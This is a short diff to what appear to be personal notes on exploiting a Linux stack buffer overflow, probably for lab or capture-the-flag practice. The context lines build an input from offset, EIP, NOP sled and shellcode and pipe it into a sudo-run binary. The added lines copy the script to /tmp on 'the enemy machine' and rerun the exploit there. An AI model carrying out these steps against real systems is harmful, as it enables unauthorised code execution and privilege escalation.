@@ -179,3 +179,7 @@ print(offset + eip + nop + buf)
 ./func  #not in gdb
 sudo ./func <<< $(python2 linbuff.py)
 #regenerate shellcode or check nop sled for trouble shooting, if that doesn't work choose new eip, if that isn't working then restart from the beginning
+scp it into tmp on the enemy machine
+get their eip and put it into it(info proc map)
+
+sudo ./func <<< $(python2 /tmp/linbuff.py)
